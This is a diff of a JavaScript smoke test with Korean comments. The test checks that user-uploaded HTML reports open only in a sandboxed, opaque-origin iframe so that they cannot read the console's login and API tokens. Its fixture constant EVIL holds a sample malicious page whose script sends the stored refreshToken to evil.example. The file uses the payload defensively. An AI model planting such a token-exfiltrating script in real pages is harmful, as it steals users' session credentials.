@@ -1,6 +1,6 @@
 /* 리포트 열기 격리 — 오프라인(Neo 불필요) · npm run smoke 포함
    · 파일 API는 계정 구분이 없어 남의 HTML이 섞일 수 있음 → 새 탭엔 틀만, 본문은 allow-same-origin 없는
-     샌드박스 iframe(불투명 오리진)에서만 실행(콘솔 오리진의 로그인 토큰 접근 차단)
+     샌드박스 iframe(불투명 오리진)에서만 실행(콘솔 오리진의 로그인·API 토큰 접근 차단)
    · 틀에 본문(스크립트) 미포함, 팝업 차단·파일 읽기 실패 처리 */
 globalThis.window = globalThis;
 import { resolveObjectURL } from 'node:buffer';
@@ -8,9 +8,10 @@ import { resolveObjectURL } from 'node:buffer';
 const EVIL = '<!DOCTYPE html><html><body><h1>보고서</h1>'
   + '<script>fetch("https://evil.example/?t="+localStorage.getItem("refreshToken"))</script></body></html>';
 let fileOk = true, fileHits = 0;
+import './_faketoken.mjs';   // db.js 관문용 토큰 칸
 globalThis.fetch = async (url) => {
   const u = String(url);
-  if (/\/web\/api\/files\//.test(u)) {
+  if (/\/db\/files\//.test(u)) {
     fileHits++;
     if (!fileOk) return { ok: false, status: 500, blob: async () => new Blob([]) };
     return { ok: true, status: 200, blob: async () => new Blob([EVIL], { type: 'application/octet-stream' }) };
